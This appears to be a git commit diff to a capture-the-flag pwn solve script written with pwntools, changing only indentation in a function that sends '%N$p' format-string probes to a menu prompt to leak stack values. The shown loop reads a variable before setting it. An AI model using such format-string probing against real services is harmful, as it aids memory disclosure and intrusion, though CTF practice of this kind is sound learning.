ddca71f9edace91d545d314ad1d58f422e39a146
szhan21 <shunda.zhang@intel.com>
2023-04-29 21:14:12 +0800

    Solving Whatdoesthefsay.

--- ctf/pwn/Whatdoesthefsay/dec.py
+++ ctf/pwn/Whatdoesthefsay/dec.py
@@ -3,10 +3,10 @@ from pwn import *
 #context.log_level = 'debug'
 
 def detect(io):
-        for i in range(len(buf)):
+	for i in range(len(buf)):
 		io.sendlineafter('2. Space food', '1')
 		io.sendlineafter('3. Deathstar(70.00 s.rocks)', '2')
 		io.sendlineafter('Red or Green Kryptonite?', '%'+str(i+1)+'$p')
 		buf = io.recvline().strip()
-                print str(i+1)+' : '+buf
+		print str(i+1)+' : '+buf
 
